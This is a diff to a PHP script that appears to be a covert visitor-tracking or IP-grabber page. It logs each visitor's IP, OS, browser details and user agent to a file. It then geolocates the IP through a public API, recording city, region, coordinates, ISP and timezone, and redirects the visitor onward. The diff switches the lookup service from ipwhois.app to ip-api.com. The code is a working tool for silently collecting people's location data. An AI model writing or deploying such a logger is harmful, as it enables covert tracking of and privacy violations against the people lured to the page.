@@ -112,54 +112,44 @@ $vr= $ust[3];
 $ver=str_replace(")", "", $vr);
 $version   = "Version              : ".$ver;
 if (strpos($PublicIP, $localHost) !== false) {
-    $details = '{
-        "success": false
-    }';
+    $details = '{"status": "fail"}';
 }
 else {
-    $details  = file_get_contents("http://ipwhois.app/json/$PublicIP");
+    $details  = file_get_contents("http://ip-api.com/json/$PublicIP");
 }
 $details  = json_decode($details, true);
-$success  = $details['success'];
+$success  = ($details['status'] === 'success');
 $fp = fopen($file, 'a');
 
-if ($success==false) {
+if (!$success) {
     fwrite($fp, $ip."\n");
     fwrite($fp, $uos."\n");
     fwrite($fp, $version."\n");
     fwrite($fp, $bsr."\n");
     fclose($fp);
-} else if ($success==true) {
-    $country    = $details['country'];
-    $city       = $details['city'];
-    $continent  = $details['continent'];
-    $tp         = $details['type'];
-    $cn         = $details['country_phone'];
-    $is         = $details['isp'];
-    $latitude   = $details['latitude'];
-    $longitude  = $details['longitude'];
-    $crn        = $details['currency'];
-    $type       = "IP Type              : ".$tp;
-    $comma      = ", ";
-    $location   = "Location             : ".$city.$comma.$country.$comma.$continent;
-    $geolocation= "GeoLocation(lat, lon): ".$latitude.$comma.$longitude;
-    $isp        = "ISP                  : ".$is;
-    $currency   = "Currency             : ".$crn;
-    
+} else {
+    $country     = $details['country'];
+    $city        = $details['city'];
+    $region      = $details['regionName'];
+    $timezone    = $details['timezone'];
+    $is          = $details['isp'];
+    $latitude    = $details['lat'];
+    $longitude   = $details['lon'];
+    $comma       = ", ";
+    $location    = "Location             : ".$city.$comma.$region.$comma.$country;
+    $geolocation = "GeoLocation(lat, lon): ".$latitude.$comma.$longitude;
+    $isp         = "ISP                  : ".$is;
+    $tz          = "Timezone             : ".$timezone;
+
     fwrite($fp, $ip."\n");
-    fwrite($fp, $type."\n");
     fwrite($fp, $uos."\n");
     fwrite($fp, $version."\n");
     fwrite($fp, $uaget."\n");
     fwrite($fp, $bsr."\n");
     fwrite($fp, $location."\n");
     fwrite($fp, $geolocation."\n");
-    fwrite($fp, $currency."\n");
-    fclose($fp);
-} else {
-    $status     = "Status               : ".$success;
-    fwrite($fp, $status."\n");
-    fwrite($fp, $uaget."\n");
+    fwrite($fp, $isp."\n");
+    fwrite($fp, $tz."\n");
     fclose($fp);
 }
 header("Location: website");
